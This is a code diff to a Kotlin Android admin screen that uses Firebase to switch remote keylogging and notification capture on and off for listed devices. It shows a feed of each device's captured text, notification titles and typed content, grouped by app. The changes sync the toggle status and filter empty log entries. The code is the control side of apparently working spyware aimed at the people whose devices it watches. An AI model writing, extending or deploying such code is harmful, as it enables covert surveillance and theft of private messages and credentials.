@@ -43,10 +43,15 @@ class AdminMainActivity : AppCompatActivity() {
         adapter = DeviceAdapter(deviceList) { device, type, newState ->
             val ref = FirebaseDatabase.getInstance().getReference("admin_commands").child(device.name)
             if (type == "key") {
+                device.keylogging = newState
                 ref.child("keylogging").setValue(newState)
+                ref.child("status").child("keylogging").setValue(newState)
             } else {
+                device.notifications = newState
                 ref.child("notifications").setValue(newState)
+                ref.child("status").child("notifications").setValue(newState)
             }
+            adapter.notifyDataSetChanged()
         }
         recyclerView.adapter = adapter
 
@@ -105,13 +110,16 @@ class AdminMainActivity : AppCompatActivity() {
                         val text = entry.child("text").getValue(String::class.java)
                             ?: entry.child("title").getValue(String::class.java)
                             ?: entry.child("typedContent").getValue(String::class.java)
-                            ?: "activity"
-                        sb.append("[$appName] $text\n")
+                            ?: continue
+
+                        if (text.isNotBlank() && text != "null") {
+                            sb.append("[$appName] $text\n")
+                        }
                     }
                 }
                 val index = deviceList.indexOfFirst { it.name == deviceName }
                 if (index != -1) {
-                    deviceList[index].logFeed = if (sb.isNotEmpty()) sb.toString() else "No recent logs."
+                    deviceList[index].logFeed = if (sb.isNotEmpty()) sb.toString() else "No recent activity."
                     adapter.notifyItemChanged(index)
                 }
             }
